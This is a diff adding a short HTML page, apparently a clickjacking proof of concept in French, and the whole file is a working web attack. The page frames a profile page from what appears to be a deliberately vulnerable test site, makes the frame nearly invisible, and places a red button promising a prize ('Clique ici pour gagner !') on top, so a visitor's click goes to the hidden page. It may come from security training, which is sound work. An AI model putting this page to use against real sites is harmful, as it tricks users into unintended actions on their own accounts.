@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Gagne un cadeau !</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01; /* quasi invisible */
+            z-index: 1;
+            border: none;
+        }
+
+        .fake-button {
+            position: absolute;
+            top: 250px;
+            left: 100px;
+            z-index: 2;
+            background-color: red;
+            color: white;
+            padding: 20px 40px;
+            font-size: 22px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <iframe src="http://testhtml5.vulnweb.com/#/profile"></iframe>
+    <div class="fake-button">Clique ici pour gagner !</div>
+</body>
+</html>
